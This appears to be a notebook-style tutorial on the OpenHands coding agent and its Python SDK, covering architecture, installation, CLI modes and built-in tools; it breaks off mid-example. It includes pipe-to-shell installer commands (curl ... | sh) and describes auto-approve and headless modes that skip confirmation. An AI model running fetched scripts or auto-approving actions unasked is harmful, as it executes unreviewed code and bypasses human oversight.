# 01 — What Is OpenHands?

**Goal:** Understand what OpenHands is, its architecture, how it compares to alternatives, and when to use it.

**What You'll Learn:**
- The event-driven agent loop that powers OpenHands
- How OpenHands compares to Devin, Claude Code, Hermes, SWE-Agent, and GitHub Copilot
- The four-package SDK architecture
- Use cases: from one-off tasks to multi-agent orchestration


## 1.1 The Problem OpenHands Solves

Before agents, AI coding tools were **autocomplete on steroids** — GitHub Copilot suggests the next line, ChatGPT writes a function when asked. But neither can:
- Read your entire codebase to understand context
- Execute shell commands and react to their output
- Iterate: write code, run tests, see failures, fix bugs, repeat
- Work autonomously for minutes or hours on a multi-file change

OpenHands fills this gap: it's an **autonomous coding agent** that perceives (reads files, runs commands, browses web), reasons (plans via LLM), and acts (writes code, executes shell, opens PRs) — all inside a sandboxed environment.


## 1.2 Core Architecture: The Event Stream

OpenHands uses an **event-driven architecture**. Every interaction — user message, LLM response, tool execution, file change — is an **immutable event** in a chronological stream.

```
┌──────────┐    Action     ┌─────────────┐    Observation    ┌──────────┐
│  AGENT   │──────────────→│  ENVIRONMENT │────────────────→│  AGENT   │
│ (LLM)    │               │ (Sandbox)    │                  │ (LLM)    │
└──────────┘               └─────────────┘                  └──────────┘
     ↑                                                          │
     └──────────────── Event Log (history) ─────────────────────┘
```

**Why events instead of mutable state?**
- **Auditability:** Every action is traceable — critical for debugging agent behavior
- **Replay:** You can replay an event stream to reproduce exactly what happened
- **Stateless agents:** The agent is a pure function of event history → no hidden state bugs


## 1.3 The Reasoning-Action Loop

This is the heartbeat of every OpenHands agent:

1. **Condense:** Compress conversation history to fit in the LLM context window
2. **Query LLM:** Send the condensed history + system prompt → get back an Action
3. **Security Check:** The Security Analyzer evaluates risk of the proposed action
4. **Execute:** Run the action (write file, run bash, browse web, etc.)
5. **Observe:** Capture the result as an Observation event
6. **Loop:** Append observation to history → go to step 1

The loop terminates when the agent emits a `FinishAction` (task complete) or hits the max iteration limit.


## 1.4 Comparison: OpenHands vs Alternatives

| Feature | OpenHands | Devin | Claude Code | Hermes Agent | GitHub Copilot |
|---|---|---|---|---|---|
| **License** | MIT (open-source) | Proprietary | Proprietary | Apache 2.0 | Proprietary |
| **Autonomy** | Full autonomous agent | Full autonomous agent | Interactive agent | General-purpose agent | Inline autocomplete |
| **Sandbox** | Docker-based, isolated | Built-in | Bash in working dir | Optional Docker | None (IDE only) |
| **Multi-model** | 100+ via litellm | Cognition-only | Anthropic-only | 30+ providers | OpenAI/GitHub models |
| **IDE Integration** | ACP (JetBrains, Zed, VS Code) | Web UI only | Terminal + VS Code | Terminal + 20 messaging platforms | IDE extensions |
| **CI/CD** | Headless mode, JSONL output | No | Via CLI | Cron scheduler | GitHub Actions |
| **Multi-agent** | Orchestration, parallel agents | No | Sub-agents (delegate_task) | Sub-agents (delegate_task) | No |
| **Skills/Condensers** | Yes | No | CLAUDE.md hooks | Yes (agentskills.io) | No |
| **Price** | Free (pay for API tokens) | $500/mo | Pay for tokens | Free (pay for tokens) | $10-39/mo |
| **SWE-bench** | 72% (Sonnet 4.5) | Not disclosed | Model-dependent | Not a coding specialist | N/A |


## 1.5 When to Use OpenHands

**Use OpenHands when:**
- You want an agent that works on your codebase autonomously for minutes/hours
- You need sandboxed execution (untrusted code, dependency installs)
- You want to automate CI/CD tasks with an AI agent
- You're building custom agent workflows via the Python SDK
- You need multi-model flexibility (swap between Claude, GPT, Gemini, local models)
- You want open-source transparency and audit trails

**Don't use OpenHands when:**
- You just want inline code completions → use Copilot or Cursor
- You want a chat-based coding assistant inside your IDE → use Claude Code or Codex
- You need a general-purpose personal assistant with memory → use Hermes


## 1.6 Four-Package SDK Architecture

The Software Agent SDK is organized into four Python packages:

| Package | Purpose | When You Need It |
|---|---|---|
| `openhands-sdk` | Core abstractions: Agent, LLM, Conversation, Event, Tool | Always — this is the foundation |
| `openhands-tools` | Built-in tools: FileEditor, Terminal, TaskTracker, WebBrowser, MCP | When you want agents that do things |
| `openhands-workspace` | Execution environments: LocalWorkspace, RemoteWorkspace, Docker sandbox | When agents need to run code |
| `openhands-agent-server` | REST/WebSocket server for remote agent execution | Production deployment, shared agents |

```
┌─────────────────────────────────────────┐
│         Your Application                │
├─────────────────────────────────────────┤
│  OpenHands CLI  │  GUI  │  Custom Code  │
├─────────────────────────────────────────┤
│       Software Agent SDK                │
│  ┌─────────┐ ┌───────┐ ┌──────────┐    │
│  │ Agent   │ │ Tools │ │Workspace │    │
│  │ LLM     │ │ MCP   │ │ Docker   │    │
│  │ Events  │ │Bash   │ │ Local    │    │
│  └─────────┘ └───────┘ └──────────┘    │
│  ┌──────────────────────────────────┐   │
│  │     Agent Server (REST/WS)       │   │
│  └──────────────────────────────────┘   │
└─────────────────────────────────────────┘
```


## Next

→ [go to Section 02](#02-) — Install OpenHands and configure your first agent


# 02 — Installation & Setup

**Goal:** Install OpenHands CLI and SDK, configure Docker, set up your LLM provider, and verify everything works.

**What You'll Learn:**
- Installing via uv (recommended) and pip
- Docker prerequisites and verification
- Configuration files and environment variables
- Connecting to OpenAI, Anthropic, OpenRouter, and local models
- Verifying your installation


## 2.1 Prerequisites

Before installing, ensure you have:
- **Python 3.12+:** OpenHands requires Python 3.12 or newer
- **uv 0.11.6+:** Fast Python package manager (required for MCP servers)
- **Docker:** For sandboxed execution and the GUI server
- **API Key:** For your chosen LLM provider


```python
# ═══════════════════════════════════════════
# 2.1 Check Prerequisites
# ═══════════════════════════════════════════
import sys, subprocess, shutil

# ─── Check Python version ───
# OpenHands requires Python 3.12+ for type parameter syntax and performance
print(f'Python version: {sys.version}')
assert sys.version_info >= (3, 12), 'Python 3.12+ is required!'
print('  ✓ Python 3.12+ detected')

# ─── Check uv availability ───
# uv is the recommended package manager — faster than pip and handles MCP server deps
uv_path = shutil.which('uv')
if uv_path:
    result = subprocess.run(['uv', '--version'], capture_output=True, text=True)
    print(f'  ✓ uv found: {result.stdout.strip()}')
else:
    print('  ✗ uv not found. Install: curl -LsSf https://astral.sh/uv/install.sh | sh')

# ─── Check Docker availability ───
# Docker is required for sandboxed code execution and the GUI server
docker_path = shutil.which('docker')
if docker_path:
    result = subprocess.run(['docker', '--version'], capture_output=True, text=True)
    print(f'  ✓ Docker found: {result.stdout.strip()}')
    # Also check if Docker daemon is running
    result2 = subprocess.run(['docker', 'info'], capture_output=True, text=True)
    if result2.returncode == 0:
        print('  ✓ Docker daemon is running')
    else:
        print('  ⚠ Docker daemon is NOT running — start Docker Desktop or dockerd')
else:
    print('  ✗ Docker not found — install Docker Desktop or docker.io')

```

## 2.2 Installing OpenHands via uv (Recommended)

The recommended installation method uses `uv tool install`. This isolates OpenHands from your project's virtual environment and handles Python version pinning automatically.

```bash
# Install OpenHands CLI + SDK
uv tool install openhands --python 3.12

# The command becomes available globally
openhands --version

# To upgrade later:
uv tool upgrade openhands --python 3.12
```

**Why uv instead of pip?**
- uv creates an isolated environment — no conflicts with your project's dependencies
- MCP servers (like the fetch MCP server) require uv for their own dependency management
- uv is 10-100x faster than pip for installation


## 2.3 Alternative: Standalone Binary

If you prefer a single binary without Python/uv dependency management:

```bash
curl -fsSL https://install.openhands.dev/install.sh | sh
```


## 2.4 Configuration Files

OpenHands stores configuration in `~/.openhands/`:

| File | Purpose |
|---|---|
| `agent_settings.json` | Agent behavior settings, condenser config |
| `cli_config.json` | CLI/TUI preferences (e.g., critic enabled) |
| `mcp.json` | MCP server configuration |
| `settings.json` | LLM provider, model, and API credentials |

**Environment variables** (only applied with `--override-with-envs`):
- `LLM_API_KEY` — API key for your LLM provider
- `LLM_MODEL` — Model name (e.g., `claude-sonnet-4-5`)
- `LLM_BASE_URL` — Custom endpoint for local models or proxies


```python
# ═══════════════════════════════════════════
# 2.4 Inspect Configuration Directory
# ═══════════════════════════════════════════
from pathlib import Path
import json

# OpenHands stores all config in ~/.openhands/
config_dir = Path.home() / '.openhands'
print(f'Config directory: {config_dir}')
print(f'  Exists: {config_dir.exists()}')

# If it exists, list the files inside
# This directory is created on first run of 'openhands'
if config_dir.exists():
    for f in sorted(config_dir.iterdir()):
        size = f.stat().st_size if f.is_file() else '-'
        print(f'  {"📄" if f.is_file() else "📁"} {f.name} ({size} bytes)')
else:
    print('  Directory not created yet — run `openhands` once to initialize')
    print('  On first run, OpenHands will guide you through LLM configuration')

```

## 2.5 Configuring Your LLM Provider

OpenHands supports **100+ model providers** via litellm. Common setups:

```bash
# Run the interactive setup (recommended for first time)
openhands
# Then type /settings to configure your LLM provider

# Or set via environment (requires --override-with-envs flag)
export LLM_API_KEY=sk-...
export LLM_MODEL=gpt-5.5
openhands --override-with-envs
```

**Common model strings:**
| Provider | Model String |
|---|---|
| OpenAI | `gpt-5.5`, `gpt-5.5-codex`, `gpt-5.4` |
| Anthropic | `claude-sonnet-4-5`, `claude-opus-4-8` |
| OpenRouter | `openrouter:anthropic/claude-sonnet-4` |
| DeepSeek | `deepseek:deepseek-chat` |
| Ollama (local) | `ollama/qwen3:32b` |
| Google | `gemini/gemini-3-pro` |


```python
# ═══════════════════════════════════════════
# 2.5 Configure LLM Programmatically (SDK)
# ═══════════════════════════════════════════
import os

# ─── Pattern 1: Direct API key ───
# Best for quick scripts — but NEVER hardcode keys in committed code
# Use environment variables or a .env file instead
from openhands.sdk import LLM

# ─── Pattern 2: From environment variable (recommended) ───
# This is the production-safe pattern — keys never touch source code
api_key = os.getenv('LLM_API_KEY')  # Set this in your shell: export LLM_API_KEY=sk-...
model_name = os.getenv('LLM_MODEL', 'gpt-5.5')  # Default if not set

# Create the LLM client — this is a thin wrapper around litellm
# The LLM object handles authentication, rate limiting, and provider routing
llm = LLM(
    model=model_name,           # The model identifier (provider-agnostic via litellm)
    api_key=api_key,            # API key from environment
    # base_url='...',           # Optional: for custom endpoints / proxies
)

print(f'LLM configured:')
print(f'  Model: {llm.model}')
print(f'  Provider: auto-detected by litellm from model string')
print(f'  API key: {"SET" if api_key else "NOT SET — export LLM_API_KEY first"}')

```

## 2.6 Verifying Your Installation

After installation, run these checks:

```bash
# Check CLI version
openhands --version

# List available commands
openhands --help

# Check SDK installation
python -c "import openhands; print(openhands.__version__)"

# Launch the TUI (interactive)
openhands

# Test headless mode (needs API key configured)
openhands --headless -t "List the files in the current directory"
```


```python
# ═══════════════════════════════════════════
# 2.6 Verify SDK Installation
# ═══════════════════════════════════════════
# This cell verifies the Python SDK is installed and importable
try:
    import openhands
    print(f'✓ openhands package imported')
    # Check for version attribute (may differ between CLI and SDK packages)
    if hasattr(openhands, '__version__'):
        print(f'  Version: {openhands.__version__}')
except ImportError as e:
    print(f'✗ openhands not installed: {e}')
    print('  Install: uv tool install openhands --python 3.12')

# Check SDK subpackages — these are the four architectural layers
subpackages = ['openhands.sdk', 'openhands.tools', 'openhands.workspace']
for pkg in subpackages:
    try:
        __import__(pkg)
        print(f'  ✓ {pkg}')
    except ImportError:
        print(f'  - {pkg} (optional — needed for advanced features)')

```

## Next

→ [go to Section 03](#03-) — Explore all CLI modes: TUI, headless, web, ACP, and cloud


# 03 — CLI Modes: TUI, Headless, Web, ACP, Cloud

**Goal:** Master all five CLI modes of OpenHands and understand when to use each.

**What You'll Learn:**
- Interactive TUI mode for development
- Headless mode for CI/CD and automation
- Web mode for browser-based access
- ACP mode for IDE integration
- Cloud mode for zero-install usage


## 3.1 CLI Mode Overview

OpenHands has five distinct CLI modes, each optimized for a different context:

| Mode | Command | Best For | Interactive |
|---|---|---|---|
| **Terminal (TUI)** | `openhands` | Interactive development, exploration | Yes |
| **Headless** | `openhands --headless -t "task"` | CI/CD, scripts, batch automation | No |
| **Web** | `openhands web` | Browser-based TUI | Yes |
| **ACP** | `openhands acp` | IDE integration (JetBrains, Zed, VS Code) | Yes (via IDE) |
| **Cloud** | `openhands cloud -t "task"` | Zero-install, shared sessions | Yes |
| **GUI Server** | `openhands serve` | Full web GUI with VSCode, VNC, browser | Yes |


## 3.2 Terminal (TUI) Mode

The default mode — a terminal UI built with Textual. Features:
- Streaming token-by-token output
- Tool execution shown live
- `/settings` command to configure LLM
- `/resume` to continue previous conversations
- Conversation history persisted in `~/.openhands/`

```bash
# Launch TUI
openhands

# With specific approval mode
openhands --always-approve    # Auto-approve all actions
openhands --llm-approve       # Use LLM to judge action safety
openhands --override-with-envs  # Use env vars for LLM config
```


## 3.3 Headless Mode — Automation & CI/CD

Headless mode runs without UI — perfect for scripts, CI pipelines, and batch processing.

**Key characteristics:**
- **Always runs in `always-approve` mode** — no confirmation prompts
- Must specify a task via `--task` or `--file`
- `--json` flag enables structured JSONL output
- Exit codes: `0` = success, `1` = error, `2` = invalid arguments


```bash
# ─── Basic headless task ───
# Runs a single task and exits — ideal for one-off automation
openhands --headless -t "Create a Python script that prints hello world"

# ─── Task from a file ───
# Pass complex, multi-line tasks via a text file
echo "Write a FastAPI app with a /health endpoint and Dockerfile" > task.txt
openhands --headless -f task.txt

# ─── JSONL output mode ───
# Structured output for downstream parsing — each line is a JSON event
openhands --headless --json -t "Add unit tests to app.py" > output.jsonl
# Each line: {"type": "action", "action": "write", "path": "test_app.py", ...}

# ─── CI/CD pipeline integration ───
# Capture exit code to determine success/failure
openhands --headless -t "Fix all linting errors" && echo "PASS" || echo "FAIL"

# ─── With environment variable override ───
# Use a different model just for this run
LLM_MODEL=claude-sonnet-4-5 openhands --headless --override-with-envs \
  -t "Review this PR diff for security issues"
```

## 3.4 Web Mode — Browser-Based TUI

`openhands web` launches a web server with a browser-accessible TUI. This is useful when:
- You're on a remote machine and want a UI
- You want to share access with team members (with auth)
- You prefer a browser interface over terminal

```bash
# Default: localhost:12000
openhands web

# Custom host and port
openhands web --host 0.0.0.0 --port 8080

# Debug mode (verbose logging)
openhands web --debug
```


## 3.5 GUI Server — Full Web Application

`openhands serve` launches the complete OpenHands GUI with Docker. This gives you:
- Full React-based web UI
- Embedded VSCode editor for viewing agent's workspace
- VNC desktop for GUI-based debugging
- Persistent Chromium browser for web tasks

```bash
# Basic launch (at http://localhost:3000)
openhands serve

# Mount current directory into the container
# The agent can then read/write your project files directly
openhands serve --mount-cwd

# Enable GPU support (for local LLM inference)
openhands serve --gpu

# Combine both
openhands serve --mount-cwd --gpu
```


## 3.6 ACP Mode — IDE Integration

The Agent Client Protocol (ACP) lets OpenHands integrate directly into IDEs via JSON-RPC 2.0 over stdio.

```bash
# Start ACP server (used by IDE configurations)
openhands acp

# With auto-approval (for trusted contexts)
openhands acp --always-approve

# With LLM-based approval (safety check before execution)
openhands acp --llm-approve

# Resume a specific conversation
openhands acp --resume abc123

# Resume the most recent conversation
openhands acp --resume --last
```


## 3.7 Cloud Mode — Zero-Install

`openhands cloud` creates a conversation on OpenHands Cloud (app.all-hands.dev) — no local Docker, no setup. Best for:
- Trying OpenHands without installing anything
- Sharing sessions with teammates
- Quick tasks on machines where you can't install Docker

```bash
# Create a cloud session with a task
openhands cloud -t "Build a REST API for a todo app"

# From a file
openhands cloud -f task.txt

# Custom server URL (self-hosted OpenHands Cloud)
openhands cloud --server-url https://my-openhands.company.com -t "Fix issue #42"
```


## 3.8 Mode Selection Decision Guide

| Scenario | Recommended Mode |
|---|---|
| Interactive coding session on my laptop | `openhands` (TUI) |
| CI pipeline that fixes lint errors automatically | `openhands --headless` |
| Remote dev server with no GUI | `openhands web` |
| Full-featured workspace with VSCode + browser | `openhands serve` |
| Inside IntelliJ / PyCharm | `openhands acp` |
| Quick test, no Docker installed | `openhands cloud` |


## Next

→ [go to Section 04](#04-) — Write your first agent with the Python SDK


# 04 — SDK Hello World: Your First Agent

**Goal:** Write and run your first OpenHands agent using the Python SDK — from LLM setup to autonomous code execution.

**What You'll Learn:**
- The three core SDK objects: LLM, Agent, Conversation
- How to configure tools for your agent
- Understanding the event stream
- Running agents locally vs remotely
- Interpreting agent output and exit conditions


## 4.1 The Three Core Objects

Every OpenHands SDK program uses exactly three objects:

```
LLM ────────────→ Agent ────────────→ Conversation
(brain)          (capabilities)     (execution loop)
```

| Object | Role | Key Parameters |
|---|---|---|
| **LLM** | The language model that does the reasoning | `model`, `api_key`, `base_url` |
| **Agent** | Defines what the agent can do — which tools, which system prompt | `llm`, `tools`, `system_prompt` |
| **Conversation** | The execution loop — holds event history, drives iteration | `agent`, `workspace` |

**The flow:** You create an LLM → wrap it in an Agent with tools → create a Conversation that runs the agent loop in a workspace.


## 4.2 Minimal Working Example

This is the smallest possible OpenHands agent — it creates a file with facts about the current project.


```python
# ═══════════════════════════════════════════
# 4.2 Minimal Working Agent
# ═══════════════════════════════════════════
import os
from pathlib import Path

# ─── Step 1: Create the LLM (the brain) ───
# The LLM object wraps the model API — it handles auth, requests, and responses
# All LLM calls go through litellm, so any supported provider works the same way
from openhands.sdk import LLM

llm = LLM(
    model=os.getenv('LLM_MODEL', 'gpt-5.5'),  # Model identifier (litellm format)
    api_key=os.getenv('LLM_API_KEY'),           # NEVER hardcode keys — use env vars
)
print(f'LLM created: model={llm.model}')

# ─── Step 2: Create the Agent (the capabilities) ───
# The Agent ties together: which LLM to use + which tools it has access to
# Tools define the agent's action space — what it can DO in the world
from openhands.sdk import Agent
from openhands.tools.file_editor import FileEditorTool
from openhands.tools.terminal import TerminalTool
from openhands.tools.task_tracker import TaskTrackerTool
from openhands.tools import Tool

# Wrap tool classes in Tool() — this registers them with the agent system
# Each Tool specifies: name, what it does, and how to execute it
agent = Agent(
    llm=llm,
    tools=[
        Tool(name=FileEditorTool.name),   # Read/write/edit files
        Tool(name=TerminalTool.name),     # Execute bash commands
        Tool(name=TaskTrackerTool.name),  # Track subtask progress
    ],
)
print(f'Agent created with {len(agent.tools)} tools')

# ─── Step 3: Create the Conversation (the execution loop) ───
# The Conversation drives the agent loop: send message → agent reasons →
# agent acts → observe result → repeat until finished
# The 'workspace' is where file operations happen — here it's a temp directory
from openhands.sdk import Conversation
import tempfile

# Create a temporary workspace — the agent's "desk" where it can create/edit files
workspace_dir = tempfile.mkdtemp(prefix='openhands_demo_')
print(f'Workspace: {workspace_dir}')

conversation = Conversation(
    agent=agent,
    workspace=workspace_dir,  # Agent can read/write files here
)

# ─── Step 4: Send a task and run ───
# This is the key method: starts the agent loop and blocks until completion
# The agent will: plan → execute tools → observe → iterate → finish
task = "Write 3 facts about Python into a file called FACTS.txt"
print(f'Task: {task}')
conversation.send_message(task)
conversation.run()  # This is the blocking call — agent works autonomously here

# ─── Step 5: Check results ───
# After run() returns, inspect what the agent created
facts_file = Path(workspace_dir) / 'FACTS.txt'
if facts_file.exists():
    print(f'\n✓ Agent created FACTS.txt:')
    print('─' * 40)
    print(facts_file.read_text())
    print('─' * 40)
else:
    print('✗ FACTS.txt was not created — check API key and model access')

# Clean up temporary workspace
import shutil
shutil.rmtree(workspace_dir, ignore_errors=True)
print(f'\nCleaned up workspace: {workspace_dir}')

```

## 4.3 Understanding the Event Stream

Every agent action generates events. Understanding this stream is crucial for debugging and custom applications.

**Event types:**
- `MessageEvent` — User message or agent response
- `ActionEvent` — Agent proposes an action (write file, run bash, etc.)
- `ObservationEvent` — Result of executing an action
- `StateChangeEvent` — Internal state transitions
- `FinishEvent` — Agent declares task complete


```python
# ═══════════════════════════════════════════
# 4.3 Reading the Event Stream
# ═══════════════════════════════════════════
# The conversation object stores all events in chronological order.
# You can inspect them to understand what the agent did step by step.

# After conversation.run() completes, events are accessible:
# (This is a DEMONSTRATION — run the cell above first to populate events)

from collections import Counter

print('Event Stream Analysis')
print('=' * 60)

# Count events by type to see the agent's activity profile
# This tells you: did it spend more time editing files or running commands?
try:
    events = conversation.events  # All events from the completed run
    type_counts = Counter(type(e).__name__ for e in events)
    print(f'Total events: {len(events)}')
    for event_type, count in type_counts.most_common():
        print(f'  {event_type}: {count}')

    # Show the last few events — these reveal how the agent concluded
    print(f'\nLast 3 events (the conclusion):')
    for event in events[-3:]:
        # Each event has a message/content field with human-readable info
        msg = getattr(event, 'message', None) or getattr(event, 'content', str(event)[:80])
        print(f'  [{type(event).__name__}] {msg}')
except NameError:
    print('No conversation object available — run the cell in 4.2 first')
except Exception as e:
    print(f'Error reading events: {e}')

```

## 4.4 Agent with Custom System Prompt

You can override the default system prompt to give the agent a specific personality or domain expertise.


```python
# ═══════════════════════════════════════════
# 4.4 Custom System Prompt Agent
# ═══════════════════════════════════════════
# The system prompt is the "constitution" of the agent — it defines its role,
# constraints, and behavior. Custom prompts let you specialize agents.

custom_prompt = """You are a Python code reviewer. Your job is to:
1. Read the provided Python files carefully
2. Identify bugs, security issues, and style violations
3. Write your findings to REVIEW.md
4. NEVER modify the original files — only write to REVIEW.md
5. Be thorough but concise — prioritize critical over cosmetic issues
"""

# Create agent with custom system prompt — overrides the default coding agent prompt
reviewer_agent = Agent(
    llm=llm,
    tools=[
        Tool(name=FileEditorTool.name),   # To read source files and write REVIEW.md
        Tool(name=TerminalTool.name),     # To run the code and see errors
    ],
    system_prompt=custom_prompt,          # This replaces the default prompt
)

print('Reviewer agent created with custom prompt')
print(f'System prompt length: {len(custom_prompt)} chars')
print(f'Key constraint: agent will only write to REVIEW.md, not modify source files')

```

## 4.5 Error Handling and Agent Limits

Agents can fail, loop infinitely, or produce bad output. The SDK provides controls:

| Control | Default | Purpose |
|---|---|---|
| `max_iterations` | 100 | Max agent loop cycles before forced stop |
| `timeout` | None | Wall-clock timeout for the entire run |
| `condenser` | Auto | Compresses history when context gets too long |
| Security Analyzer | Enabled | Blocks high-risk actions |


```python
# ═══════════════════════════════════════════
# 4.5 Agent with Limits
# ═══════════════════════════════════════════
# Production agents should always have limits — infinite loops waste API credits

# The Conversation object accepts limits that prevent runaway agents
# These are safety nets, not targets — a good agent finishes well before limits
from openhands.sdk import Conversation as LimitedConversation

# Create a conversation with explicit limits
limited_conv = Conversation(
    agent=agent,
    workspace=workspace_dir,
    max_iterations=20,     # Stop after 20 reasoning-action cycles
    # timeout=300,         # Or stop after 5 minutes (wall clock)
)

print('Conversation limits configured:')
print(f'  Max iterations: {getattr(limited_conv, "max_iterations", "default (100)")}')
print(f'  Tip: set max_iterations lower during development to catch loops early')
print(f'  Tip: use timeout for production to guarantee termination')

```

## 4.6 Key Takeaways

1. **LLM → Agent → Conversation** is the universal pattern
2. **Tools are the action space** — without tools, the agent can only talk
3. **The workspace is the agent's sandbox** — everything happens inside it
4. **Events are the source of truth** — inspect them to debug agent behavior
5. **Always set limits** — max_iterations and timeouts prevent runaway costs


## Next

→ [go to Section 05](#05-) — Deep dive into all built-in tools and workspace types


# 05 — Tools & Workspace: The Agent's Hands and Desk

**Goal:** Master every built-in tool and understand workspace types — local, Docker, and remote.

**What You'll Learn:**
- FileEditorTool: read, write, edit, search files
- TerminalTool: bash execution with tmux-based interactive terminal
- TaskTrackerTool: autonomous task decomposition and tracking
- WebBrowserTool: web browsing for research and documentation
- MCPTool: connecting external MCP servers
- LocalWorkspace vs RemoteWorkspace vs Docker sandbox
- Creating custom tools


## 5.1 The Tool System Architecture

Tools are how the agent interacts with the world. Each tool has:

```
┌─────────────────────────────────────┐
│              Tool                   │
├─────────────────────────────────────┤
│ name: str         Unique identifier │
│ description: str  LLM sees this     │
│ parameters: JSON  Input schema      │
├─────────────────────────────────────┤
│ execute(action) → Observation       │
└─────────────────────────────────────┘
```

**The LLM chooses which tool to invoke** based on the tool descriptions and the current task. The agent never "calls" a tool — it emits an Action, and the Tool Executor runs it.


## 5.2 FileEditorTool — Read, Write, Edit, Search

The most-used tool. Capabilities:
- `read`: Read a file (with line numbers, offset, limit)
- `write`: Create or overwrite a file
- `edit`: Find-and-replace within a file
- `search`: Regex search across files (ripgrep-backed)
- `list`: List directory contents


```python
# ═══════════════════════════════════════════
# 5.2 FileEditorTool — Programmatic Usage
# ═══════════════════════════════════════════
# While agents use FileEditorTool via actions, you can also call it directly
# for testing or building custom workflows

from openhands.tools.file_editor import FileEditorTool
from pathlib import Path
import tempfile

# ─── Create a workspace directory ───
workdir = Path(tempfile.mkdtemp(prefix='tool_demo_'))
print(f'Workspace: {workdir}')

# ─── The FileEditorTool needs a workspace path ───
# It resolves all paths relative to this root for sandbox safety
editor = FileEditorTool(workspace_path=str(workdir))

# ─── Write a file ───
# The agent would emit: Action(name='write', path='hello.py', content='...')
# We call execute() directly for demonstration
from openhands.tools.file_editor.actions import FileWriteAction
write_action = FileWriteAction(
    path='hello.py',
    content='''"""A simple Python module."""

def greet(name: str) -> str:
    """Return a greeting for the given name."""
    return f"Hello, {name}!"

if __name__ == "__main__":
    print(greet("World"))
'''
)
result = editor.execute(write_action)
print(f'Write result: {result}')

# ─── Read the file back ───
# The agent reads files with offset/limit for large files
from openhands.tools.file_editor.actions import FileReadAction
read_action = FileReadAction(path='hello.py')
result = editor.execute(read_action)
print(f'\nRead result:\n{result}')

# ─── Edit the file (find-and-replace) ───
# This is how the agent makes precise changes without rewriting entire files
from openhands.tools.file_editor.actions import FileEditAction
edit_action = FileEditAction(
    path='hello.py',
    old_string='Hello',         # Find this exact string
    new_string='Greetings',     # Replace with this
)
result = editor.execute(edit_action)
print(f'\nEdit result: {result}')

# Verify the edit
print(f'\nUpdated file content:')
print((workdir / 'hello.py').read_text())

# ─── Clean up ───
import shutil
shutil.rmtree(workdir)

```

## 5.3 TerminalTool — Bash Execution

The TerminalTool gives the agent access to a bash shell. Key features:
- Foreground command execution with output capture
- Background processes (servers, watchers)
- Tmux-based interactive terminal for persistent sessions
- Timeout and output size limits for safety
- Working directory persistence across calls


```python
# ═══════════════════════════════════════════
# 5.3 TerminalTool — Direct Invocation
# ═══════════════════════════════════════════
from openhands.tools.terminal import TerminalTool
from openhands.tools.terminal.actions import BashAction

# TerminalTool executes commands in the workspace directory
# For safety, it runs in a subprocess, not the agent's process
term = TerminalTool(workspace_path=str(Path(tempfile.mkdtemp())))

# ─── Simple command ───
action = BashAction(command='echo "Hello from the agent terminal!" && python --version')
result = term.execute(action)
print(f'Command output:\n{result}')

# ─── Command with working directory ───
# The agent can set workdir to run commands in specific subdirectories
action2 = BashAction(
    command='pwd && ls -la',
    workdir='/tmp',  # Run in a specific directory
)
result2 = term.execute(action2)
print(f'\nWith workdir:\n{result2}')

# ─── Command with timeout ───
# Long-running or hanging commands need timeouts
action3 = BashAction(
    command='sleep 1 && echo "Done after 1 second"',
    timeout=3000,  # 3 seconds in milliseconds
)
result3 = term.execute(action3)
print(f'\nWith timeout:\n{result3}')

```

## 5.4 TaskTrackerTool — Autonomous Task Decomposition

The TaskTrackerTool lets the agent break down complex tasks into subtasks and track progress.

**How it works:**
1. Agent creates a task list: `[{"id": "1", "content": "Read the codebase", "status": "pending"}, ...]`
2. Agent marks tasks `in_progress` as it works on them
3. Agent marks tasks `completed` when done
4. The tool enforces only ONE task in_progress at a time

This gives the LLM a **structured way to plan** rather than trying to hold the entire plan in its context.


## 5.5 WebBrowserTool — Web Browsing

The WebBrowserTool lets the agent browse the web — reading documentation, searching for solutions, checking API references.

Capabilities:
- Navigate to URLs
- Click elements
- Fill forms
- Extract page content as markdown
- Execute JavaScript for dynamic pages


## 5.6 MCPTool — Model Context Protocol Integration

MCP (Model Context Protocol) connects OpenHands to external tools and data sources: databases, APIs, file systems, SaaS platforms.

```bash
# Configure MCP servers in ~/.openhands/mcp.json
{
  "mcpServers": {
    "fetch": {
      "command": "uvx",
      "args": ["mcp-server-fetch"]
    },
    "github": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-github"],
      "env": {"GITHUB_PERSONAL_ACCESS_TOKEN": "..."}
    }
  }
}
```

These tools appear alongside built-in tools — the agent can use them just like FileEditor or Terminal.


## 5.7 Workspace Types

The workspace is the agent's execution environment. Three types:

| Type | Class | When to Use |
|---|---|---|
| **Local** | `LocalWorkspace` | Development, prototyping, trusted code |
| **Docker** | Docker sandbox (via Agent Server) | Untrusted code, dependency isolation |
| **Remote** | `RemoteWorkspace` | Shared agents, cloud execution |

```python
# Local workspace — agent runs on your machine
from openhands.workspace import LocalWorkspace
workspace = LocalWorkspace(path='/path/to/project')

# Remote workspace — agent runs on a remote Agent Server
from openhands.workspace import RemoteWorkspace
workspace = RemoteWorkspace(
    base_url='http://localhost:8000',
    api_key='your-server-token',
)
```


## 5.8 Creating a Custom Tool

You can extend OpenHands with your own tools. A custom tool needs:
- A name and description (for the LLM to understand)
- An action Pydantic model (the input)
- An execute method (the implementation)


```python
# ═══════════════════════════════════════════
# 5.8 Custom Tool: WeatherChecker
# ═══════════════════════════════════════════
# This demonstrates the complete pattern for creating a custom tool.
# Custom tools let you give agents domain-specific superpowers.

from openhands.tools import BaseTool, Tool
from openhands.sdk.events import Observation
from pydantic import BaseModel, Field
import json

# ─── Step 1: Define the Action (what the LLM passes to the tool) ───
# Pydantic model gives the LLM a typed schema via the function-calling API
class WeatherCheckAction(BaseModel):
    """Check the weather for a city."""
    city: str = Field(description='City name, e.g. "San Francisco"')
    units: str = Field(default='metric', description='metric or imperial')

# ─── Step 2: Create the Tool class ───
# Inherit from BaseTool and implement: name, action_class, execute()
class WeatherCheckerTool(BaseTool):
    # The 'name' is how the agent identifies this tool
    name: str = 'weather_check'

    # The action_class maps the LLM's function call to a typed Python object
    @property
    def action_class(self):
        return WeatherCheckAction

    # The execute method does the actual work
    # It receives a typed action and returns an Observation
    async def execute(self, action: WeatherCheckAction) -> Observation:
        # In production, call a real weather API here
        # This mock returns deterministic data for demonstration
        temps = {
            'san francisco': 18, 'new york': 22, 'london': 12,
            'tokyo': 25, 'sydney': 20, 'berlin': 15
        }
        temp = temps.get(action.city.lower(), 20)
        if action.units == 'imperial':
            temp = temp * 9/5 + 32  # Convert to Fahrenheit

        result = {
            'city': action.city,
            'temperature': temp,
            'units': action.units,
            'conditions': 'sunny' if temp > 20 else 'cloudy',
        }

        # Return an Observation — this is what the agent sees
        return Observation(
            content=json.dumps(result, indent=2),
